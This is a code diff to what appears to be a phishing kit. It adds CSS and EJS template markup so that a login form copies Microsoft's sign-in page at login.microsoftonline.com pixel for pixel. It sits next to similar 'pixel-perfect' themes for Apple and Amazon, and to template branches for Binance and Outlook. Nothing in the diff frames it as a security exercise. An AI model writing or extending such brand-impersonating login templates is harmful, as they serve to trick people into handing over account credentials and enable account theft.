@@ -97,13 +97,20 @@
   body.brand-apple .ap-footer { margin-top:16px; padding-top:14px; border-top:1px solid #e5e5ea; font-size:.78rem; color:#8e8e93; text-align:center; }
   body.brand-apple .ap-footer a { color:#0071e3; }
 
-  body.brand-microsoft { background:#fff; color:#323130; font-family:'Segoe UI',system-ui; }
-  body.brand-microsoft .auth { background:#fff; border:none; box-shadow:none; border-radius:0; max-width:440px; }
-  body.brand-microsoft h1 { color:#323130; font-weight:600; font-family:'Segoe UI',sans-serif; }
-  body.brand-microsoft input { background:#fff; border:1px solid #605e5c; border-radius:2px; color:#323130; }
-  body.brand-microsoft input:focus { border-color:#0067b8; border-width:2px; background:#fff; box-shadow:none; }
-  body.brand-microsoft button { background:#0067b8; border-radius:2px; background-image:none; font-weight:600; }
+  /* Microsoft: pixel-perfect — login.microsoftonline.com */
+  body.brand-microsoft { background:#fff; color:#323130; font-family:'Segoe UI',SegoeUI,'Helvetica Neue',system-ui,sans-serif; }
+  body.brand-microsoft .auth { background:#fff; border:1px solid #8a8886; box-shadow:none; border-radius:0; max-width:440px; padding:44px 44px 36px; }
+  body.brand-microsoft .logo-svg { margin-bottom:16px; display:block; }
+  body.brand-microsoft h1 { color:#323130; font-weight:600; font-size:1.5rem; text-align:left; margin-bottom:16px; font-family:'Segoe UI',sans-serif; }
+  body.brand-microsoft .sub { display:none; }
+  body.brand-microsoft label { display:block; font-size:.875rem; font-weight:400; color:#323130; margin-bottom:4px; }
+  body.brand-microsoft input { background:#fff; border:1px solid #605e5c; border-bottom:2px solid #605e5c; border-radius:2px; color:#323130; font-size:.875rem; padding:6px 8px; height:36px; }
+  body.brand-microsoft input:focus { border-color:#0067b8; border-bottom-color:#0067b8; border-width:1px; border-bottom-width:2px; background:#fff; box-shadow:none; outline:none; }
+  body.brand-microsoft input::placeholder { color:#a19f9d; }
+  body.brand-microsoft button { background:#0067b8; color:#fff; border-radius:0; background-image:none; font-weight:600; font-size:.875rem; height:36px; font-family:'Segoe UI',sans-serif; margin-top:16px; }
   body.brand-microsoft button:hover { background:#005a9e; transform:none; filter:none; }
+  body.brand-microsoft .ms-footer { margin-top:20px; font-size:.8125rem; color:#0067b8; }
+  body.brand-microsoft .ms-footer a { color:#0067b8; }
 
   /* Amazon: pixel-perfect — amazon.com/ap/signin */
   body.brand-amazon { background:#fff; color:#0f1111; font-family:Arial,sans-serif; }
@@ -2109,6 +2116,10 @@
   <% if (tpl.key === 'binance') { %>
     <div class="bn-forgot"><a href="#" onclick="return false">Forgot password?</a></div>
     <div class="bn-footer">Don't have an account? <a href="#" onclick="return false">Register</a></div>
+  <% } %>
+  <% if (tpl.key === 'microsoft') { %>
+    <div class="ms-footer"><a href="#" onclick="return false">No account? Create one!</a></div>
+    <div class="ms-footer" style="margin-top:4px"><a href="#" onclick="return false">Can't access your account?</a></div>
   <% } %>
   <% if (tpl.key === 'microsoftoutlook' || tpl.key === 'outlook') { %>
     <div class="ms-links">
